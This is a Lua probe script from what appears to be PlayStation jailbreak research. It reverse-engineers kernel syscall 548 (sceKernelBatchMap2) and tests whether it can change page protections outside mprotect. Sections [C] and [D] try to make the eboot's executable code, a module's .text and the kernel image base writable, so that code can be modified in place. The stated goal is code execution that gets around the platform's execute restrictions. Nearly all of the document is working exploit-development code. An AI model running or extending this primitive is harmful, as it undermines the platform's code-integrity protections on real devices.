-- CRASH_CLASS: MODERATE -- [C] asks the VM layer to make a page of the loader's own code writable,
-- and [D] asks for the same on the kernel image. Both are gated on a positive control from [A]: if
-- 548 cannot move the protection of a page this probe owns, nothing else is attempted. Nothing is
-- written to any foreign page -- [C]'s writability test stores back the exact qword it just read, so
-- a successful store leaves the bytes unchanged and a refused store faults.
-- PROBE 1479c: sys 548 op 2 (PROTECT), the entry layout 1479b measured, with the 547 record fixed.
--
-- 1479b established the layout by single-byte variation with op=2 fixed at +0x1C:
--   +0x00 = 0xFF -> EINVAL, +0x01 = 0xFF -> EINVAL, +0x02..+0x07 -> rv=0 processed=1
--   +0x08..+0x0F -> rv=0 (inert)      +0x10 = 0xFF -> EINVAL, +0x11 = 0xFF -> EINVAL
--   +0x12 = 0xFF -> rv=0              +0x13 = 0xFF -> process died
-- 0xFF and 0xFF00 are not 4 KiB aligned while 0xFF0000 and above are, so the entry is
--   +0x00 start (qword, aligned)  +0x08 offset  +0x10 length (qword, aligned)
--   +0x18 protection (dword)      +0x1C op (byte)
-- which is SceKernelBatchMapEntry, i.e. 548 is the syscall under sceKernelBatchMap2.
--
-- The 13.60 body (VA 0xffffffff8b47be60, decoded from docs/dumps_13.60) shows op 2's case at
-- 0xffffffff8b47c0b0: it checks start and length alignment with `test esi,0x3fff` / `test edx,0x3fff`
-- (32-bit, so only the low half of each qword), refuses protection bit 0x8 (`and ecx,8; jne`),
-- normalises WRITE into READ|WRITE (`shr ecx,1; and ecx,0xffffffc1; or ecx,edi`), then calls
-- 0xffffffff8ac8bdb0 (vm_map_protect) with (vm_map, start, end, prot) and set_max = 0. A start equal
-- to the end is KERN_SUCCESS, which is why an all-zero entry returns 0 with processed=1.
--
-- So this is a second path to the PTE protection bits, one that does not pass through mprotect(2).
-- mprotect(2) refuses any request whose PROT_EXEC bit is set, and the hypervisor drops the execute
-- bit even when a Sony handler reports success. The question here is narrower and more useful: does
-- this path let a range the caller does not own -- eboot text, a module's .text -- become writable?
-- If it does, the loader's own RX code can be edited in place and restored, which is code execution
-- without ever asking for an executable page.
--
-- -- prior art:
--   results/phase36_realargs/1479b_sys548_field_map_20261109_192622.txt (the byte map above)
--   results/phase36_realargs/1479a_sys548_batch_contract_20261109_192503.txt (contract, op 2 works)
--   results/kernel_handlers/asm/sys_548.asm (PART B, RVA 0xabbe60)
--   docs/dumps_13.60/kernel_text.bin (op 2 body decoded at 0xffffffff8b47c0b0)
--   results/phase14_final_push/55f_674_deep_dump_20261018_100958.txt (674 record layout)
--   results 1362a (547 whole-record dump: {start_lo, start_hi, end_lo, end_hi, prot, flags})
--   docs/VM_LAYER_14_10.md (munmap/mprotect/673 behaviour already measured)

print("=== PROBE 1479c: SYS 548 PROTECT SEMANTICS ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) return string.format("0x%X", v) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local sc548 = mk(548)
local sc477 = mk(477)
local sc547 = mk(547)
local sc674 = mk(674)

local ent = memory.alloc(0x40)
local rec = memory.alloc(0x20)
local cnt = memory.alloc(0x10)

local function set_entry(start, offset, len, prot, op)
    for i = 0, 0x38 do pcall(function() memory.write_byte(ent + i, 0) end) end
    pcall(function() memory.write_qword(ent + 0x00, uint64(hex(start))) end)
    pcall(function() memory.write_qword(ent + 0x08, uint64(hex(offset))) end)
    pcall(function() memory.write_qword(ent + 0x10, uint64(hex(len))) end)
    pcall(function() memory.write_dword(ent + 0x18, uint64(prot)) end)
    pcall(function() memory.write_byte(ent + 0x1C, op) end)
end

local function v548(a1, flags, count, tag)
    pcall(function() memory.write_dword(cnt, uint64(0xEEEEEEEE)) end)
    print(string.format("  -> %-48s", tag))
    local ok, v = pcall(function()
        return N(sc548(uint64(a1), uint64(flags), uint64(ent), uint64(count), uint64(cnt), uint64(0)))
    end)
    local pc = "?"
    local ok2, v2 = pcall(function() return N(memory.read_dword(cnt)) end)
    if ok2 then pc = string.format("%d", v2 % 4294967296) end
    if ok then
        print(string.format("     rv=%-4d %-20s processed=%s", v, (v == -1) and es() or "", pc))
    else
        print(string.format("     EXC processed=%s", pc))
    end
    return v
end

-- sys 547 copies a 0x18-byte record {start_lo, start_hi, end_lo, end_hi, prot, flags}; it is a
-- vm_map metadata lookup that never dereferences, so any address may be asked about.
local function prot_of(addr, tag)
    pcall(function() for i = 0, 0x18, 4 do memory.write_dword(rec + i, uint64(0)) end end)
    local ok, v = pcall(function()
        return N(sc547(uint64(hex(addr)), uint64(rec), uint64(0), uint64(0), uint64(0), uint64(0)))
    end)
    local st, pr, slo, shi = -1, -1, 0, 0
    if ok then
        st = v
        if v == 0 then
            pr  = N(memory.read_dword(rec + 0x10))
            slo = N(memory.read_dword(rec + 0x00))
            shi = N(memory.read_dword(rec + 0x04))
        end
    end
    print(string.format("     [%s] 547 rv=%d prot=%d start=0x%X%08X", tag, st, pr, shi, slo))
    return pr
end

local PROTECT_WORKS = false

-- ---------------------------------------------------------------- [A] our own anonymous page
local anon = N(sc477(uint64(0), uint64(0x4000), uint64(3), uint64(0x1000), uint64(0xFFFFFFFF), uint64(0)))
print("")
print("--- [A] positive control: an anonymous RW page of ours ---")
print(string.format("[A] anon=0x%X", anon))
if anon <= 0 or anon == 0xFFFFFFFFFFFFFFFF then
    print("[A] mmap failed")
else
    pcall(function() memory.write_dword(anon, uint64(0x47524142)) end)
    local before = prot_of(anon, "before")

    for _, pr in ipairs({1, 0, 3, 7}) do
        set_entry(anon, 0, 0x1000, pr, 2)
        local rv = v548(0, 0, 1, string.format("PROTECT anon prot=%d", pr))
        if rv == 0 then
            local got = prot_of(anon, string.format("after prot=%d", pr))
            if got == pr or (pr == 2 and got == 3) then
                PROTECT_WORKS = true
                print("     ** 548 changed the protection **")
            end
        end
    end

    -- leave the page readable again and prove it with a read
    set_entry(anon, 0, 0x1000, 3, 2)
    v548(0, 0, 1, "restore anon prot=3")
    local okr, val = pcall(function() return N(memory.read_dword(anon)) end)
    print(string.format("     anon read ok=%s val=0x%08X", tostring(okr), okr and (val % 4294967296) or 0))
    print(string.format("[A] PROTECT_WORKS=%s", tostring(PROTECT_WORKS)))
end

if not PROTECT_WORKS then
    print("")
    print("[!] op 2 never moved a protection this probe owns; [B], [C] and [D] are skipped.")
    print("    (the remaining questions are only meaningful once the call is shown to work)")
end

-- ---------------------------------------------------------------- [B] our own GPU page
if PROTECT_WORKS then
    print("")
    print("--- [B] a GPU-flag mapping (0x1002), which has its own pager ---")
    local gpu = N(sc477(uint64(0), uint64(0x4000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    print(string.format("[B] gpu=0x%X", gpu))
    if gpu <= 0 or gpu == 0xFFFFFFFFFFFFFFFF then
        print("[B] mmap failed")
    else
        prot_of(gpu, "before")
        for _, pr in ipairs({3, 7}) do
            set_entry(gpu, 0, 0x1000, pr, 2)
            local rv = v548(0, 0, 1, string.format("PROTECT gpu prot=%d", pr))
            if rv == 0 then prot_of(gpu, string.format("after prot=%d", pr)) end
        end
    end
end

-- ---------------------------------------------------------------- [C] a foreign RX page
if PROTECT_WORKS then
    print("")
    print("--- [C] an executable page we do not own ---")
    local buf = memory.alloc(0x8000)
    local eboot_text, other_text = 0, 0
    for i = 0, 0x8000, 8 do pcall(function() memory.write_byte(buf + i, 0) end) end
    local okc, c = pcall(function()
        return N(sc674(uint64(buf), uint64(72), uint64(400), uint64(cnt), uint64(0x40000000)))
    end)
    local nrec = 0
    pcall(function() nrec = N(memory.read_dword(cnt)) end)
    print(string.format("[C] 674 rv=%s records=%d", tostring(okc and c or "EXC"), nrec))
    local function u64at(b, off)
        local lo, hi = 0, 0
        pcall(function() lo = N(memory.read_dword(b + off)) end)
        pcall(function() hi = N(memory.read_dword(b + off + 4)) end)
        return lo + hi * 4294967296
    end
    if nrec > 400 then nrec = 400 end
    for i = 0, nrec - 1 do
        local b = buf + i * 72
        local s = u64at(b, 0x00)
        local e = u64at(b, 0x08)
        local pr = 0
        pcall(function() pr = N(memory.read_dword(b + 0x18)) end)
        local name = ""
        for k = 0, 27 do
            local ch = 0
            pcall(function() ch = N(memory.read_byte(b + 0x21 + k)) end)
            if ch == 0 or ch < 32 or ch >= 127 then break end
            name = name .. string.char(ch)
        end
        if pr == 5 and s ~= 0 then
            if name == "executable" and eboot_text == 0 then
                eboot_text = s
                print(string.format("    eboot RX: 0x%X end=0x%X prot=%d name=%s", s, e, pr, name))
            elseif name:find("%.prx$") and other_text == 0 then
                other_text = s
                print(string.format("    module RX: 0x%X end=0x%X prot=%d name=%s", s, e, pr, name))
            end
        end
    end

    -- A same-value store is the writability test: the qword is read, then written back verbatim.
    -- If the page is writable the contents do not change; if it is not, the store faults.
    local function write_test(addr, tag)
        local q = nil
        local okr = pcall(function() q = memory.read_qword(addr) end)
        if not okr or q == nil then
            print(string.format("     [%s] read failed, no write test", tag))
            return
        end
        print(string.format("     [%s] read qword ok, storing the same value back ...", tag))
        local okw, err = pcall(function() memory.write_qword(addr, q) end)
        print(string.format("     [%s] same-value store ok=%s %s", tag, tostring(okw),
            okw and "" or tostring(err)))
    end

    if eboot_text ~= 0 then
        eboot_text = eboot_text - (eboot_text % 0x1000)
        prot_of(eboot_text, "eboot before")
        -- prot=7 keeps the page executable, so even if it is applied the loader keeps running and
        -- the readback is reachable. prot=3 drops the execute bit, so if THAT is applied to the
        -- page the interpreter is executing from, the process dies at the next instruction fetch
        -- and the pre-call tag is the last line -- which is itself the answer. The same-value store
        -- therefore comes last, after everything that could still be read back.
        set_entry(eboot_text, 0, 0x1000, 7, 2)
        local rv7 = v548(0, 0, 1, "PROTECT eboot text prot=7 (RWX)")
        if rv7 == 0 then prot_of(eboot_text, "eboot after prot=7") end
        set_entry(eboot_text, 0, 0x1000, 3, 2)
        local rv = v548(0, 0, 1, "PROTECT eboot text prot=3 (RW, drops X)")
        if rv == 0 then
            prot_of(eboot_text, "eboot after prot=3")
            write_test(eboot_text, "eboot RW?")
        end
        set_entry(eboot_text, 0, 0x1000, 5, 2)
        v548(0, 0, 1, "restore eboot prot=5 (RX)")
        prot_of(eboot_text, "eboot restored")
    else
        print("    (no 'executable' RX record found)")
    end

    if other_text ~= 0 then
        other_text = other_text - (other_text % 0x1000)
        prot_of(other_text, "module before")
        set_entry(other_text, 0, 0x1000, 3, 2)
        local rv = v548(0, 0, 1, "PROTECT module .text prot=3 (RW)")
        if rv == 0 then
            prot_of(other_text, "module after prot=3")
            write_test(other_text, "module RW?")
            set_entry(other_text, 0, 0x1000, 5, 2)
            v548(0, 0, 1, "restore module prot=5")
        end
    end
end

-- ---------------------------------------------------------------- [D] the kernel image
if PROTECT_WORKS then
    print("")
    print("--- [D] the kernel image base, last ---")
    print("    (0xFFFFFFFFC1000000 is this boot's measured base; a refusal is the expected answer)")
    local KIMG = 0xFFFFFFFFC1000000
    prot_of(KIMG, "kimg before")
    set_entry(KIMG, 0, 0x1000, 1, 2)
    local rv = v548(0, 0, 1, "PROTECT kernel base prot=1")
    if rv == 0 then prot_of(KIMG, "kimg after") end
end

print("")
local canary = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("final canary: pid=%d", canary))
print("=== PROBE 1479c COMPLETE ===")
